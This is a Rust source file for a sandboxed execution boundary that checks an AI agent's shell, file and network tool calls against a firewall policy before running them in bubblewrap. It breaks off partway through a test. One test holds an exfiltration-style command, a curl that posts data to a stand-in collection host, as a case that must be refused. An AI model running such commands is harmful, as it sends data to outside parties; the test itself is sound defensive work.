// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2026 Arthur Lin (carbon-evolution)

//! Fail-closed execution wrapper for high-risk agent tools.
//!
//! The hook daemon decides whether a tool call is acceptable, but it cannot
//! contain a process that a different caller starts directly.  This module is
//! the explicit execution boundary: on Linux it launches the command through
//! bubblewrap with a private user/pid/network namespace, read-only system
//! mounts, one writable workspace, dropped capabilities, a clean environment,
//! bounded output, and a hard timeout.  Unsupported hosts and network
//! allowlists fail closed instead of silently running unsandboxed.

use std::path::PathBuf;
use std::time::Duration;
use std::{fs, io::Write, path::Path};

use anyhow::{bail, Context};
use futures_util::StreamExt;
use llm_firewall_adapter::DecisionResponse;
use llm_firewall_agent::{AgentEvent, AgentFirewall, EventKind, Verdict};
use reqwest::{Client, Url};
use serde::Serialize;

/// Network access for a sandboxed command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum NetworkPolicy {
    /// Create a network namespace with no interfaces or egress.
    Deny,
    /// Reserved for a future egress-proxy integration.  It is deliberately
    /// rejected today because a broad `--share-net` would defeat the boundary.
    Allowlist(Vec<String>),
}

/// A bounded command execution request.
#[derive(Debug, Clone)]
pub struct SandboxSpec {
    pub program: String,
    pub args: Vec<String>,
    /// Directory mounted read/write at `/workspace` inside the sandbox.
    pub workspace: PathBuf,
    pub network: NetworkPolicy,
    pub timeout: Duration,
    pub max_output_bytes: usize,
}

/// Result returned without exposing inherited environment or host paths.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct SandboxResult {
    pub status: Option<i32>,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
    pub timed_out: bool,
}

/// A shell command whose exact bytes are inspected before execution.
///
/// This is intentionally narrower than a generic "run tool" API: the command
/// inspected by the agent firewall is the same command passed to `sh -c`, so a
/// caller cannot inspect one value and execute another. Other tool kinds need a
/// similarly typed adapter before they can use this boundary.
#[derive(Debug, Clone)]
pub struct GuardedShellSpec {
    pub session: String,
    pub agent: String,
    pub seq: u64,
    pub command: String,
    pub workspace: PathBuf,
    pub network: NetworkPolicy,
    pub timeout: Duration,
    pub max_output_bytes: usize,
}

/// The privacy-safe decision and result of a guarded shell execution.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GuardedShellResult {
    pub decision: DecisionResponse,
    pub execution: SandboxResult,
}

/// A typed workspace file write whose exact path and content are inspected
/// before the write. This deliberately does not expose an arbitrary host path
/// or a shell fallback: the target must remain under the caller-provided
/// workspace and existing symlinks are rejected.
#[derive(Debug, Clone)]
pub struct GuardedFileWriteSpec {
    pub session: String,
    pub agent: String,
    pub seq: u64,
    pub path: PathBuf,
    pub content: String,
    pub workspace: PathBuf,
}

/// Privacy-safe result of a typed file write. The path and content are not
/// echoed so this value is safe to return through a hook or CLI response.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GuardedFileWriteResult {
    pub decision: DecisionResponse,
    pub bytes_written: usize,
}

/// A typed workspace file deletion whose exact target is inspected before the
/// mutation. Existing symlinks are rejected and the target must remain below
/// the canonical workspace.
#[derive(Debug, Clone)]
pub struct GuardedFileDeleteSpec {
    pub session: String,
    pub agent: String,
    pub seq: u64,
    pub path: PathBuf,
    pub workspace: PathBuf,
}

/// Privacy-safe result of a typed file deletion.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GuardedFileDeleteResult {
    pub decision: DecisionResponse,
    pub deleted: bool,
}

/// A typed workspace file rename whose exact source and destination are
/// inspected before the mutation. The destination must not already be a
/// symlink or non-file, and both paths must remain below the workspace.
#[derive(Debug, Clone)]
pub struct GuardedFileRenameSpec {
    pub session: String,
    pub agent: String,
    pub seq: u64,
    pub from: PathBuf,
    pub to: PathBuf,
    pub workspace: PathBuf,
}

/// Privacy-safe result of a typed file rename.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GuardedFileRenameResult {
    pub decision: DecisionResponse,
    pub renamed: bool,
}

/// A typed, retrieval-only network request. The exact URL is inspected as a
/// `WebFetch` tool call before the request is sent. A proxy is mandatory so a
/// caller cannot silently turn this adapter into an unrestricted direct
/// network client.
#[derive(Debug, Clone)]
pub struct GuardedNetworkFetchSpec {
    pub session: String,
    pub agent: String,
    pub seq: u64,
    pub url: String,
    /// An HTTP(S) egress proxy controlled by the deployment. The proxy itself
    /// must be HTTPS, or loopback HTTP for disposable local tests.
    pub proxy_url: String,
    pub timeout: Duration,
    pub max_response_bytes: usize,
}

/// Privacy-safe result of a typed network fetch. The response body is bounded
/// because it is intentionally returned to the agent as untrusted content;
/// URLs, query strings, and headers are never echoed.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct GuardedNetworkFetchResult {
    pub decision: DecisionResponse,
    pub host: String,
    pub status: u16,
    pub body: String,
    pub body_truncated: bool,
}

/// Inspect and, only for an explicit local `Allow`, execute a shell command in
/// the OS sandbox. Human `Ask` decisions and unresolved `Escalate` outcomes are
/// fail-closed here because this API has no approval channel or judge tier.
pub async fn run_guarded_shell(
    firewall: &mut AgentFirewall,
    spec: GuardedShellSpec,
) -> anyhow::Result<GuardedShellResult> {
    if spec.session.is_empty() || spec.agent.is_empty() || spec.command.is_empty() {
        bail!("guarded shell session, agent, and command are required");
    }
    if spec.session.len() > 256 || spec.agent.len() > 256 {
        bail!("guarded shell session or agent is oversized");
    }
    if spec.session.chars().any(char::is_control) || spec.agent.chars().any(char::is_control) {
        bail!("guarded shell session or agent contains a control character");
    }
    if spec.command.chars().any(|c| c == '\0' || c.is_control()) {
        bail!("guarded shell command contains a control character");
    }

    let command = spec.command;
    let event = AgentEvent {
        session: spec.session,
        agent: spec.agent,
        parent: None,
        seq: spec.seq,
        at_ms: 0,
        kind: EventKind::ToolCall {
            tool: "Bash".into(),
            args: serde_json::json!({ "command": command }),
        },
    };
    let outcome = firewall.inspect(&event);
    // Do not use the adapter's Escalate fallback here: a local executor has no
    // human/judge approval channel, so only an explicit Allow may cross into
    // process creation.
    if outcome.verdict != Verdict::Allow {
        let label = match outcome.verdict {
            Verdict::Allow => "allow",
            Verdict::Ask => "ask",
            Verdict::Deny => "deny",
            Verdict::Escalate => "escalate",
        };
        let rule = outcome.rule.as_deref().unwrap_or("none");
        bail!("guarded shell execution refused: verdict={label} rule={rule}");
    }

    let decision = outcome.adapter_response("agentfw-local");
    let execution = run(SandboxSpec {
        program: "sh".into(),
        args: vec!["-c".into(), event_command(&event)?],
        workspace: spec.workspace,
        network: spec.network,
        timeout: spec.timeout,
        max_output_bytes: spec.max_output_bytes,
    })
    .await?;
    Ok(GuardedShellResult {
        decision,
        execution,
    })
}

const MAX_FILE_WRITE_BYTES: usize = 16 * 1024 * 1024;

/// Inspect and, only for an explicit local `Allow`, write a UTF-8 file inside
/// the supplied workspace. This is a typed adapter for a common agent write
/// tool; arbitrary filesystem APIs still need their own adapter and policy
/// event before they may be exposed to an agent.
pub async fn run_guarded_file_write(
    firewall: &mut AgentFirewall,
    spec: GuardedFileWriteSpec,
) -> anyhow::Result<GuardedFileWriteResult> {
    if spec.session.is_empty() || spec.agent.is_empty() {
        bail!("guarded file write session and agent are required");
    }
    if spec.session.len() > 256 || spec.agent.len() > 256 {
        bail!("guarded file write session or agent is oversized");
    }
    if spec.session.chars().any(char::is_control) || spec.agent.chars().any(char::is_control) {
        bail!("guarded file write session or agent contains a control character");
    }
    if spec.content.len() > MAX_FILE_WRITE_BYTES {
        bail!("guarded file write content is oversized");
    }

    let path_text = spec.path.to_string_lossy().into_owned();
    let event = AgentEvent {
        session: spec.session,
        agent: spec.agent,
        parent: None,
        seq: spec.seq,
        at_ms: 0,
        kind: EventKind::ToolCall {
            tool: "Write".into(),
            args: serde_json::json!({
                "file_path": path_text,
                "content": spec.content,
            }),
        },
    };
    let outcome = firewall.inspect(&event);
    // This adapter has no human/judge approval channel. An Escalate therefore
    // cannot be weakened to Allow at the execution boundary.
    if outcome.verdict != Verdict::Allow {
        let label = match outcome.verdict {
            Verdict::Allow => "allow",
            Verdict::Ask => "ask",
            Verdict::Deny => "deny",
            Verdict::Escalate => "escalate",
        };
        let rule = outcome.rule.as_deref().unwrap_or("none");
        bail!("guarded file write refused: verdict={label} rule={rule}");
    }

    // Canonicalization and target validation are read-only. No filesystem
    // mutation occurs until after the policy decision above has allowed it.
    let workspace = validate_workspace_path(&spec.workspace)?;
    let target = resolve_workspace_target(&workspace, &spec.path)?;
    let content = spec.content.into_bytes();
    let bytes_written =
        tokio::task::spawn_blocking(move || write_workspace_file(&target, &content))
            .await
            .context("guarded file write task failed")??;
    Ok(GuardedFileWriteResult {
        decision: outcome.adapter_response("agentfw-local"),
        bytes_written,
    })
}

/// Inspect and, only for an explicit local `Allow`, delete a regular file
/// inside the supplied workspace. This adapter never shells out and has no
/// human approval channel, so every non-Allow outcome fails closed.
pub async fn run_guarded_file_delete(
    firewall: &mut AgentFirewall,
    spec: GuardedFileDeleteSpec,
) -> anyhow::Result<GuardedFileDeleteResult> {
    validate_file_operation_identity(&spec.session, &spec.agent, "delete")?;
    let path_text = spec.path.to_string_lossy().into_owned();
    let event = AgentEvent {
        session: spec.session,
        agent: spec.agent,
        parent: None,
        seq: spec.seq,
        at_ms: 0,
        kind: EventKind::ToolCall {
            tool: "Delete".into(),
            args: serde_json::json!({ "file_path": path_text }),
        },
    };
    let outcome = firewall.inspect(&event);
    require_file_operation_allow(outcome.verdict, outcome.rule.as_deref(), "delete")?;
    let workspace = validate_workspace_path(&spec.workspace)?;
    let target = resolve_workspace_target(&workspace, &spec.path)?;
    let deleted = tokio::task::spawn_blocking(move || delete_workspace_file(&target))
        .await
        .context("guarded file delete task failed")??;
    Ok(GuardedFileDeleteResult {
        decision: outcome.adapter_response("agentfw-local"),
        deleted,
    })
}

/// Inspect and, only for an explicit local `Allow`, atomically rename a
/// regular file inside the supplied workspace. Parent directories must already
/// exist; no shell or arbitrary host filesystem API is used.
pub async fn run_guarded_file_rename(
    firewall: &mut AgentFirewall,
    spec: GuardedFileRenameSpec,
) -> anyhow::Result<GuardedFileRenameResult> {
    validate_file_operation_identity(&spec.session, &spec.agent, "rename")?;
    let from_text = spec.from.to_string_lossy().into_owned();
    let to_text = spec.to.to_string_lossy().into_owned();
    let event = AgentEvent {
        session: spec.session,
        agent: spec.agent,
        parent: None,
        seq: spec.seq,
        at_ms: 0,
        kind: EventKind::ToolCall {
            tool: "Rename".into(),
            args: serde_json::json!({ "from": from_text, "to": to_text }),
        },
    };
    let outcome = firewall.inspect(&event);
    require_file_operation_allow(outcome.verdict, outcome.rule.as_deref(), "rename")?;
    let workspace = validate_workspace_path(&spec.workspace)?;
    let from = resolve_workspace_target(&workspace, &spec.from)?;
    let to = resolve_workspace_target(&workspace, &spec.to)?;
    let renamed = tokio::task::spawn_blocking(move || rename_workspace_file(&from, &to))
        .await
        .context("guarded file rename task failed")??;
    Ok(GuardedFileRenameResult {
        decision: outcome.adapter_response("agentfw-local"),
        renamed,
    })
}

/// Inspect and fetch an allowlisted HTTPS URL through the configured egress
/// proxy. Only an explicit local `Allow` crosses into network I/O; all other
/// verdicts fail closed because this adapter has no approval channel.
pub async fn run_guarded_network_fetch(
    firewall: &mut AgentFirewall,
    spec: GuardedNetworkFetchSpec,
) -> anyhow::Result<GuardedNetworkFetchResult> {
    validate_network_identity(&spec.session, &spec.agent)?;
    let url = validate_fetch_url(&spec.url)?;
    let proxy_url = validate_proxy_url(&spec.proxy_url)?;
    validate_network_limits(spec.timeout, spec.max_response_bytes)?;

    let event = AgentEvent {
        session: spec.session,
        agent: spec.agent,
        parent: None,
        seq: spec.seq,
        at_ms: 0,
        kind: EventKind::ToolCall {
            tool: "WebFetch".into(),
            args: serde_json::json!({ "url": spec.url }),
        },
    };
    let outcome = firewall.inspect(&event);
    require_network_fetch_allow(outcome.verdict, outcome.rule.as_deref())?;

    // Re-check that the policy's extracted host is the URL host we are about
    // to send. This closes parser drift between the policy layer and reqwest.
    let host = url
        .host_str()
        .ok_or_else(|| anyhow::anyhow!("guarded network URL has no host"))?
        .to_ascii_lowercase();
    if outcome.egress_hosts.len() != 1
        || !outcome
            .egress_hosts
            .iter()
            .any(|candidate| candidate.eq_ignore_ascii_case(&host))
    {
        bail!("guarded network URL host was not represented by the policy extractor");
    }
    if !firewall.egress_hosts_allowlisted(&outcome.egress_hosts) {
        bail!("guarded network URL host is not on the egress allowlist");
    }

    let client = Client::builder()
        .proxy(
            reqwest::Proxy::all(proxy_url.as_str())
                .map_err(|_| anyhow::anyhow!("guarded egress proxy configuration is invalid"))?,
        )
        .redirect(reqwest::redirect::Policy::none())
        .connect_timeout(spec.timeout)
        .timeout(spec.timeout)
        .build()
        .context("guarded network client")?;
    let response = client
        .get(url)
        .send()
        .await
        .map_err(|_| anyhow::anyhow!("guarded network request failed"))?;
    if let Some(length) = response.content_length() {
        if length > spec.max_response_bytes as u64 {
            bail!("guarded network response exceeds the configured limit");
        }
    }

    let status = response.status().as_u16();
    let mut stream = response.bytes_stream();
    let mut bytes = Vec::new();
    let mut body_truncated = false;
    while let Some(chunk) = stream.next().await {
        let chunk = chunk.map_err(|_| anyhow::anyhow!("guarded network response stream failed"))?;
        let remaining = spec.max_response_bytes.saturating_sub(bytes.len());
        if chunk.len() > remaining {
            bytes.extend_from_slice(&chunk[..remaining]);
            body_truncated = true;
            break;
        }
        bytes.extend_from_slice(&chunk);
    }
    let body = String::from_utf8(bytes).context("guarded network response is not UTF-8")?;
    Ok(GuardedNetworkFetchResult {
        decision: outcome.adapter_response("agentfw-local"),
        host,
        status,
        body,
        body_truncated,
    })
}

fn validate_network_identity(session: &str, agent: &str) -> anyhow::Result<()> {
    if session.is_empty() || agent.is_empty() {
        bail!("guarded network session and agent are required");
    }
    if session.len() > 256 || agent.len() > 256 {
        bail!("guarded network session or agent is oversized");
    }
    if session.chars().any(char::is_control) || agent.chars().any(char::is_control) {
        bail!("guarded network session or agent contains a control character");
    }
    Ok(())
}

const MAX_NETWORK_URL_BYTES: usize = 8 * 1024;
const MAX_NETWORK_RESPONSE_BYTES: usize = 16 * 1024 * 1024;

fn validate_network_limits(timeout: Duration, max_response_bytes: usize) -> anyhow::Result<()> {
    if timeout.is_zero() || timeout > Duration::from_secs(120) {
        bail!("guarded network timeout must be between one millisecond and two minutes");
    }
    if max_response_bytes == 0 || max_response_bytes > MAX_NETWORK_RESPONSE_BYTES {
        bail!("guarded network response limit is outside the safe range");
    }
    Ok(())
}

fn validate_fetch_url(raw: &str) -> anyhow::Result<Url> {
    if raw.is_empty() || raw.len() > MAX_NETWORK_URL_BYTES || raw.chars().any(char::is_control) {
        bail!("guarded network URL is empty, oversized, or contains a control character");
    }
    let url = Url::parse(raw).context("guarded network URL is invalid")?;
    if url.username() != "" || url.password().is_some() {
        bail!("guarded network URL must not contain userinfo");
    }
    if url.fragment().is_some() {
        bail!("guarded network URL must not contain a fragment");
    }
    let host = url
        .host_str()
        .ok_or_else(|| anyhow::anyhow!("guarded network URL must contain a host"))?;
    let loopback = is_loopback_host(host);
    match url.scheme() {
        "https" => {}
        "http" if loopback => {}
        _ => bail!("guarded network URL must use HTTPS (HTTP is loopback-only)"),
    }
    Ok(url)
}

fn validate_proxy_url(raw: &str) -> anyhow::Result<Url> {
    if raw.is_empty() || raw.len() > MAX_NETWORK_URL_BYTES || raw.chars().any(char::is_control) {
        bail!("guarded egress proxy URL is empty, oversized, or contains a control character");
    }
    let url = Url::parse(raw).context("guarded egress proxy URL is invalid")?;
    if url.username() != ""
        || url.password().is_some()
        || (url.path() != "/" && !url.path().is_empty())
        || url.query().is_some()
        || url.fragment().is_some()
    {
        bail!("guarded egress proxy URL must not contain credentials, a path, or query data");
    }
    let host = url
        .host_str()
        .ok_or_else(|| anyhow::anyhow!("guarded egress proxy URL must contain a host"))?;
    match url.scheme() {
        "https" => {}
        "http" if is_loopback_host(host) => {}
        _ => bail!("guarded egress proxy must use HTTPS (HTTP is loopback-only)"),
    }
    Ok(url)
}

fn is_loopback_host(host: &str) -> bool {
    host.eq_ignore_ascii_case("localhost")
        || host
            .parse::<std::net::IpAddr>()
            .is_ok_and(|address| address.is_loopback())
}

fn require_network_fetch_allow(verdict: Verdict, rule: Option<&str>) -> anyhow::Result<()> {
    if verdict == Verdict::Allow {
        return Ok(());
    }
    let label = match verdict {
        Verdict::Allow => "allow",
        Verdict::Ask => "ask",
        Verdict::Deny => "deny",
        Verdict::Escalate => "escalate",
    };
    bail!(
        "guarded network fetch refused: verdict={label} rule={}",
        rule.unwrap_or("none")
    );
}

fn validate_file_operation_identity(
    session: &str,
    agent: &str,
    operation: &str,
) -> anyhow::Result<()> {
    if session.is_empty() || agent.is_empty() {
        bail!("guarded file {operation} session and agent are required");
    }
    if session.len() > 256 || agent.len() > 256 {
        bail!("guarded file {operation} session or agent is oversized");
    }
    if session.chars().any(char::is_control) || agent.chars().any(char::is_control) {
        bail!("guarded file {operation} session or agent contains a control character");
    }
    Ok(())
}

fn require_file_operation_allow(
    verdict: Verdict,
    rule: Option<&str>,
    operation: &str,
) -> anyhow::Result<()> {
    if verdict == Verdict::Allow {
        return Ok(());
    }
    let label = match verdict {
        Verdict::Allow => "allow",
        Verdict::Ask => "ask",
        Verdict::Deny => "deny",
        Verdict::Escalate => "escalate",
    };
    bail!(
        "guarded file {operation} refused: verdict={label} rule={}",
        rule.unwrap_or("none")
    );
}

fn event_command(event: &AgentEvent) -> anyhow::Result<String> {
    match &event.kind {
        EventKind::ToolCall { tool, args } if tool == "Bash" => args
            .get("command")
            .and_then(serde_json::Value::as_str)
            .map(ToOwned::to_owned)
            .ok_or_else(|| anyhow::anyhow!("guarded shell command is not a string")),
        _ => bail!("guarded shell event is not a Bash tool call"),
    }
}

const MAX_ARGUMENT_BYTES: usize = 64 * 1024;
const MAX_OUTPUT_BYTES: usize = 16 * 1024 * 1024;

fn validate(spec: &SandboxSpec) -> anyhow::Result<PathBuf> {
    if spec.program.is_empty() || spec.program.len() > MAX_ARGUMENT_BYTES {
        bail!("sandbox program is empty or oversized");
    }
    if spec.program.chars().any(|c| c == '\0' || c.is_control()) {
        bail!("sandbox program contains a control character");
    }
    let argument_bytes: usize = spec.args.iter().map(String::len).sum();
    if argument_bytes > MAX_ARGUMENT_BYTES
        || spec.args.iter().any(|arg| arg.chars().any(|c| c == '\0'))
    {
        bail!("sandbox arguments are oversized or contain a NUL byte");
    }
    if spec.timeout.is_zero() || spec.timeout > Duration::from_secs(600) {
        bail!("sandbox timeout must be between one millisecond and ten minutes");
    }
    if spec.max_output_bytes == 0 || spec.max_output_bytes > MAX_OUTPUT_BYTES {
        bail!("sandbox output limit is outside the safe range");
    }
    let workspace = validate_workspace_path(&spec.workspace)?;
    if let NetworkPolicy::Allowlist(hosts) = &spec.network {
        if hosts.is_empty() {
            bail!("an empty network allowlist is ambiguous; use network=deny");
        }
        bail!("network allowlists require an egress proxy; refusing unsandboxed network access");
    }
    Ok(workspace)
}

fn validate_workspace_path(workspace: &Path) -> anyhow::Result<PathBuf> {
    let workspace = workspace
        .canonicalize()
        .with_context(|| format!("sandbox workspace does not exist: {}", workspace.display()))?;
    if !workspace.is_dir() {
        bail!("sandbox workspace must be a directory");
    }
    if workspace.parent().is_none() {
        bail!("refusing to mount the host filesystem root as a workspace");
    }
    Ok(workspace)
}

fn resolve_workspace_target(workspace: &Path, requested: &Path) -> anyhow::Result<PathBuf> {
    if requested.as_os_str().is_empty() {
        bail!("guarded file operation path is empty");
    }
    if requested
        .components()
        .any(|component| matches!(component, std::path::Component::ParentDir))
    {
        bail!("guarded file operation path traversal is not allowed");
    }
    let candidate = if requested.is_absolute() {
        requested.to_path_buf()
    } else {
        workspace.join(requested)
    };
    let file_name = candidate
        .file_name()
        .filter(|name| !name.is_empty())
        .ok_or_else(|| anyhow::anyhow!("guarded file operation target must be a file"))?;
    let parent = candidate
        .parent()
        .ok_or_else(|| anyhow::anyhow!("guarded file operation target has no parent"))?
        .canonicalize()
        .context("guarded file write parent does not exist")?;
    if !parent.starts_with(workspace) {
        bail!("guarded file operation target is outside the workspace");
    }
    let target = parent.join(file_name);
    if let Ok(metadata) = fs::symlink_metadata(&target) {
        if metadata.file_type().is_symlink() {
            bail!("guarded file operation refuses a symlink target");
        }
        if !metadata.file_type().is_file() {
            bail!("guarded file operation target is not a regular file");
        }
    }
    Ok(target)
}

fn delete_workspace_file(target: &Path) -> anyhow::Result<bool> {
    let metadata = fs::symlink_metadata(target).context("guarded file delete target is missing")?;
    if metadata.file_type().is_symlink() || !metadata.file_type().is_file() {
        bail!("guarded file delete target is not a regular file");
    }
    fs::remove_file(target).context("failed to delete guarded file target")?;
    Ok(true)
}

fn rename_workspace_file(from: &Path, to: &Path) -> anyhow::Result<bool> {
    let source = fs::symlink_metadata(from).context("guarded file rename source is missing")?;
    if source.file_type().is_symlink() || !source.file_type().is_file() {
        bail!("guarded file rename source is not a regular file");
    }
    if let Ok(destination) = fs::symlink_metadata(to) {
        if destination.file_type().is_symlink() || !destination.file_type().is_file() {
            bail!("guarded file rename destination is not a regular file");
        }
    }
    fs::rename(from, to).context("failed to rename guarded file target")?;
    Ok(true)
}

fn write_workspace_file(target: &Path, content: &[u8]) -> anyhow::Result<usize> {
    // The target was checked with symlink_metadata immediately before this
    // operation. Typed writes never follow an existing symlink; a later race
    // is outside this single-process adapter's authority and should be
    // addressed with an OS-specific openat/O_NOFOLLOW implementation before
    // exposing untrusted multi-user workspaces.
    let mut file = fs::OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(target)
        .context("failed to open guarded file write target")?;
    file.write_all(content)
        .context("failed to write guarded file target")?;
    file.sync_all()
        .context("failed to sync guarded file target")?;
    Ok(content.len())
}

/// Execute one command inside the OS sandbox.
pub async fn run(spec: SandboxSpec) -> anyhow::Result<SandboxResult> {
    let workspace = validate(&spec)?;

    #[cfg(target_os = "linux")]
    {
        run_linux(spec, workspace).await
    }

    #[cfg(not(target_os = "linux"))]
    {
        let _ = workspace;
        bail!("agentfw sandbox requires Linux bubblewrap; refusing host execution");
    }
}

#[cfg(target_os = "linux")]
fn add_ro_bind_if_present(args: &mut Vec<String>, path: &str) {
    if std::path::Path::new(path).exists() {
        args.extend(["--ro-bind".into(), path.into(), path.into()]);
    }
}

#[cfg(target_os = "linux")]
async fn run_linux(spec: SandboxSpec, workspace: PathBuf) -> anyhow::Result<SandboxResult> {
    use std::process::Stdio;

    use tokio::io::{AsyncRead, AsyncReadExt};
    use tokio::process::Command;
    use tokio::time::timeout;

    let mut bwrap_args = vec![
        "--die-with-parent".to_string(),
        "--new-session".to_string(),
        // Explicitly require a user namespace.  `--unshare-all` uses the
        // best-effort user namespace mode on newer bwrap versions; adding the
        // strict flag makes a missing kernel capability an error, not a weaker
        // sandbox.
        "--unshare-all".to_string(),
        "--unshare-user".to_string(),
        "--clearenv".to_string(),
        "--cap-drop".to_string(),
        "ALL".to_string(),
    ];

    // Bind only a minimal runtime, never the host root.  The command can see
    // system libraries and tools but user data is available only through the
    // explicit workspace mount below.
    for path in ["/usr", "/bin", "/sbin", "/lib", "/lib64"] {
        add_ro_bind_if_present(&mut bwrap_args, path);
    }
    bwrap_args.extend(["--dir".into(), "/etc".into()]);
    for path in [
        "/etc/passwd",
        "/etc/group",
        "/etc/nsswitch.conf",
        "/etc/hosts",
        "/etc/ld.so.cache",
        "/etc/localtime",
    ] {
        add_ro_bind_if_present(&mut bwrap_args, path);
    }
    bwrap_args.extend([
        "--dev".into(),
        "/dev".into(),
        "--proc".into(),
        "/proc".into(),
        "--tmpfs".into(),
        "/tmp".into(),
        "--dir".into(),
        "/workspace".into(),
        "--bind".into(),
        workspace.to_string_lossy().into_owned(),
        "/workspace".into(),
        "--chdir".into(),
        "/workspace".into(),
        "--setenv".into(),
        "PATH".into(),
        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
        "--setenv".into(),
        "HOME".into(),
        "/tmp".into(),
        "--setenv".into(),
        "LANG".into(),
        "C.UTF-8".into(),
        "--".into(),
        spec.program.clone(),
    ]);
    bwrap_args.extend(spec.args.clone());

    let mut child = Command::new("bwrap")
        .args(&bwrap_args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .context("failed to start bubblewrap; install bwrap or keep the tool disabled")?;
    let mut stdout = child
        .stdout
        .take()
        .context("sandbox stdout was not captured")?;
    let mut stderr = child
        .stderr
        .take()
        .context("sandbox stderr was not captured")?;
    let limit = spec.max_output_bytes;

    async fn read_capped<R: AsyncRead + Unpin>(
        mut reader: R,
        limit: usize,
    ) -> std::io::Result<(Vec<u8>, bool)> {
        let mut out = Vec::with_capacity(limit.min(8192));
        let mut buf = [0_u8; 8192];
        let mut truncated = false;
        loop {
            let read = reader.read(&mut buf).await?;
            if read == 0 {
                break;
            }
            if out.len() < limit {
                let keep = (limit - out.len()).min(read);
                out.extend_from_slice(&buf[..keep]);
                if keep < read {
                    truncated = true;
                }
            } else {
                truncated = true;
            }
        }
        Ok((out, truncated))
    }

    let collected = timeout(spec.timeout, async {
        let (stdout, stderr, status) = tokio::join!(
            read_capped(&mut stdout, limit),
            read_capped(&mut stderr, limit),
            child.wait(),
        );
        Ok::<_, anyhow::Error>((stdout?, stderr?, status?))
    })
    .await;

    let (stdout, stderr, status, timed_out) = match collected {
        Ok(Ok(((stdout, stdout_truncated), (stderr, stderr_truncated), status))) => (
            (stdout, stdout_truncated),
            (stderr, stderr_truncated),
            Some(status),
            false,
        ),
        Ok(Err(error)) => return Err(error).context("sandbox process failed"),
        Err(_) => {
            let _ = child.kill().await;
            let _ = child.wait().await;
            ((Vec::new(), false), (Vec::new(), false), None, true)
        }
    };

    Ok(SandboxResult {
        status: status.and_then(|value| value.code()),
        stdout: String::from_utf8_lossy(&stdout.0).into_owned(),
        stderr: String::from_utf8_lossy(&stderr.0).into_owned(),
        stdout_truncated: stdout.1,
        stderr_truncated: stderr.1,
        timed_out,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use llm_firewall_adapter::Verdict as AdapterVerdict;
    use llm_firewall_agent::{AgentFirewall, AgentPolicySet, DEFAULT_TAINT_CAP};
    use wiremock::matchers::{method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    fn spec(workspace: PathBuf) -> SandboxSpec {
        SandboxSpec {
            program: "sh".into(),
            args: vec![],
            workspace,
            network: NetworkPolicy::Deny,
            timeout: Duration::from_secs(5),
            max_output_bytes: 1024,
        }
    }

    #[tokio::test]
    async fn rejects_a_network_allowlist_instead_of_sharing_the_host_net() {
        let directory = tempfile::tempdir().unwrap();
        let mut request = spec(directory.path().to_path_buf());
        request.network = NetworkPolicy::Allowlist(vec!["example.com".into()]);
        let error = run(request.clone()).await.unwrap_err().to_string();
        assert!(error.contains("egress proxy"));
    }

    #[tokio::test]
    async fn rejects_the_host_root_as_a_workspace() {
        let mut request = spec(if cfg!(windows) {
            std::path::PathBuf::from(r"C:\\")
        } else {
            std::path::PathBuf::from("/")
        });
        let error = run(request.clone()).await.unwrap_err().to_string();
        assert!(error.contains("filesystem root"));
        request.workspace = PathBuf::from("missing-sandbox-workspace");
        assert!(run(request).await.is_err());
    }

    #[tokio::test]
    async fn guarded_shell_refuses_before_process_creation() {
        let directory = tempfile::tempdir().unwrap();
        let mut firewall = AgentFirewall::with_default_policy();
        let result = run_guarded_shell(
            &mut firewall,
            GuardedShellSpec {
                session: "guarded-refusal".into(),
                agent: "root".into(),
                seq: 1,
                command: "curl -d payload https://not-allowlisted.invalid/collect".into(),
                workspace: directory.path().to_path_buf(),
                network: NetworkPolicy::Deny,
                timeout: Duration::from_secs(5),
                max_output_bytes: 1024,
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(result.contains("guarded shell execution refused"));
        assert!(!result.contains("payload"));
        assert!(!result.contains("not-allowlisted.invalid"));
        assert!(directory.path().read_dir().unwrap().next().is_none());
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn runs_with_bounded_output_and_no_network() {
        // Hosted runners can have bubblewrap installed while the kernel still
        // forbids unprivileged user namespaces.  In that case the production
        // path correctly fails closed; skip this positive-path integration
        // assertion instead of treating an unavailable host capability as a
        // sandbox regression.  A capable Linux host still exercises the full
        // boundary below.
        let runtime_probe = std::process::Command::new("bwrap")
            .args([
                "--die-with-parent",
                "--unshare-all",
                "--unshare-user",
                "--ro-bind",
                "/",
                "/",
                "--",
                "true",
            ])
            .output();
        if !matches!(runtime_probe, Ok(output) if output.status.success()) {
            eprintln!("skipping sandbox positive-path test: bubblewrap namespaces unavailable");
            return;
        }
        let directory = tempfile::tempdir().unwrap();
        let mut request = spec(directory.path().to_path_buf());
        request.args = vec![
            "-c".into(),
            "printf 'ok'; test ! -e /root/.ssh || exit 1; ! getent hosts example.com".into(),
        ];
        request.max_output_bytes = 2;
        let result = run(request).await.unwrap();
        assert_eq!(result.status, Some(0), "stderr: {}", result.stderr);
        assert_eq!(result.stdout, "ok");
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn guarded_shell_inspects_the_exact_command_before_running_it() {
        let runtime_probe = std::process::Command::new("bwrap")
            .args([
                "--die-with-parent",
                "--unshare-all",
                "--unshare-user",
                "--ro-bind",
                "/",
                "/",
                "--",
                "true",
            ])
            .output();
        if !matches!(runtime_probe, Ok(output) if output.status.success()) {
            eprintln!(
                "skipping guarded sandbox positive-path test: bubblewrap namespaces unavailable"
            );
            return;
        }

        let directory = tempfile::tempdir().unwrap();
        let mut firewall = AgentFirewall::with_default_policy();
        let result = run_guarded_shell(
            &mut firewall,
            GuardedShellSpec {
                session: "guarded-allow".into(),
                agent: "root".into(),
